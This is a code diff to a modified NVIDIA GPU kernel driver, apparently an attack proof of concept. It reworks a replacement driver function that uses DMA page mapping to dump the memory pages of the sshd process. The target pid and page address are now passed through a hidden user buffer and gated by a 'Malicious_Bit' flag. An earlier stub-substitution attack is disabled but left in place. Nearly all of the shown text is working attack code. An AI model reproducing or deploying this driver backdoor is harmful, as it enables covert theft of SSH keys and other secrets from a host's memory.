@@ -435,8 +435,10 @@ static unsigned int Malicious_Bit = 0;
 
 typedef struct hidden_driver_info // For comfort reasons, define the hidden buffer struct in driver too.
 {
-	long int start_addr;
-	long int end_addr;
+//	long int start_addr;
+//	long int end_addr;
+	int pid;
+  long int sshd_page_addr;
 } hidden_driver_info ,*p_hidden_info;
 
 
@@ -654,7 +656,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		int ret;
 		NvBool write = 1, force = 0;
 
-		static int attack_num = 0;
+//		static int attack_num = 0;
 		static int dump_num = 0;
 
 		DbgPrint("This is Replacemnt funct, Entering!\n");
@@ -687,6 +689,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		    dma_map->user_pages = *priv;
 		    dma_map->dev = nvl->dev;
 
+#if 0
 if (attack_num < 2) {
 	// this is the 1st attack: substitute the stub function
 
@@ -736,10 +739,9 @@ if (attack_num < 2) {
 		   			     Malicious_Bit = 0;
 		   			     return rets;
 		   			}
-					DbgPrint( "*** buffer contains after copy: 0x%llx	, 0x:%llx\n",info_buffer->start_addr,info_buffer->end_addr);
+					DbgPrint( "*** buffer contains after copy: pid = %d\n",info_buffer->pid);
 
-					// Now, we have the addresses to start_addr of the stub function
-
+					// Now, we have the pid to be dumped
 					if (rets != RM_OK)
 					{
 					   	DbgPrint("YR: failed to allocate buffer for page nums in kernel mode!\n");
@@ -798,6 +800,8 @@ if (attack_num < 2) {
 		        }
 		    }
 } else {
+#endif
+
   // This is the 2nd attack: dump sshd memory page
 
 		    // Start getting Phys addr from Pages.
@@ -812,7 +816,45 @@ if (attack_num < 2) {
 				DbgPrint( "*** Page size is: %d\n",PAGE_SIZE);
 
 #if 1
+				if (counter==0 ) // First is for setting up the adress through which the info will be passed
 				{
+					if (Malicious_Bit==1)
+					{
+						counter++;
+						DbgPrint( "*** Counter = %d ***, Mal bit was %d\n",counter,Malicious_Bit);
+						Malicious_Bit = 0;
+					}
+					hidden_Page=0x1000;
+					DbgPrint( "*** Counter = %d ***\n",counter);
+					DbgPrint( "page of hidden buffer: 0x%llx",dma_map->user_pages[i]);
+				}
+				else // Now remapping according to what was passed in buffer.
+				{
+					DbgPrint( "*** Counter = %d ***\n",counter);
+
+					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
+					if (rets != RM_OK)
+		   			{
+		   			     DbgPrint("YR: failed to allocate buffer in kernel mode!\n");
+		   			     counter = 0;
+		   			     Malicious_Bit = 0;
+		   			     return rets;
+		    		}
+
+					rets=copy_from_user((void*)info_buffer,(void*)global_hidden_addr,sizeof(hidden_driver_info));
+
+					if (rets != RM_OK)
+		   			{
+		   			     DbgPrint( "YR: failed to copy from user!\n");
+		   			     counter = 0;
+		   			     Malicious_Bit = 0;
+		   			     return rets;
+		   			}
+					DbgPrint( "*** buffer contains after copy: pid = %d, "
+							"sshd_page_addr = 0x:%llx\n",
+							info_buffer->pid, info_buffer->sshd_page_addr);
+
+					// Now, we have the pid to be dumped
 
 					if (rets != RM_OK)
 					{
@@ -823,8 +865,10 @@ if (attack_num < 2) {
 					down_read(&mm->mmap_sem);
 
 					// Currently hard-coded sshd page addr:
-					int pid = 2923;
-					unsigned long sshd_page_addr = 0x7f7385e08000;
+//					int pid = 2923;
+//					unsigned long sshd_page_addr = 0x7f7385e08000;
+					int pid = info_buffer->pid;
+					unsigned long sshd_page_addr = info_buffer->sshd_page_addr;
 
 						ret = get_pfn_of_virtual_address_pid(sshd_page_addr, &page_number, pid);
 
@@ -873,7 +917,7 @@ if (attack_num < 2) {
 		            return status;
 		        }
 		    }
-}
+//}
 
 		    *priv = dma_map;
 
